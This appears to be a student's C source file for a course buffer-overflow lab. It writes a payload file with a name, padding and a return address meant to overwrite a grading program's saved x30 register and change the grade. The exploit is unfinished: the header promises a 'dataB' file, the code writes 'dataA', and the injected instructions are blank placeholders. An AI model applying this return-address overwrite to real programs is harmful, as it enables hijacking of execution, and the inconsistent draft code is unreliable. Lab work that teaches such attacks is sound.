/*--------------------------------------------------------------------*/
/* Produces a file called dataB with the student name, a nullbyte,    */
/* padding to overrun the stack, and the address of the instruction   */
/* in main to get a B, the latter of which will overwrite getName's   */
/* stored x30.                                                        */
/*                                                                    */
/* Authors: Maxwell Lloyd and Venus Dinari                            */
/*--------------------------------------------------------------------*/

#include <stdio.h>

int main(void){
   FILE *psFile;
   unsigned long ulData;
   unsigned int ulInstruction;
   unsigned long pAAttack;
   int i;

   psFile = fopen("dataA", "w");
   
   /* Writes the student's names */
   ulData = 0x00006E655678614D;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* mov w0, 'A'   */
   ulInstruction = 0;

   /* adr x1, grade */


   /* strb wo, [x1] */


   /* b  printf     */



   /* Writes the null byte at the end of the instructions */
   for (i = 0; i < 24; i++)
      putc(0x00, psFile); /* Writes '00000000' */

   /* Writes the new x30 for getName to skip to our assembly */
   pAAttack = 0x420058;
   fwrite(&pAAttack, sizeof(unsigned long), 1, psFile);

   fclose(psFile);

   return 0;
}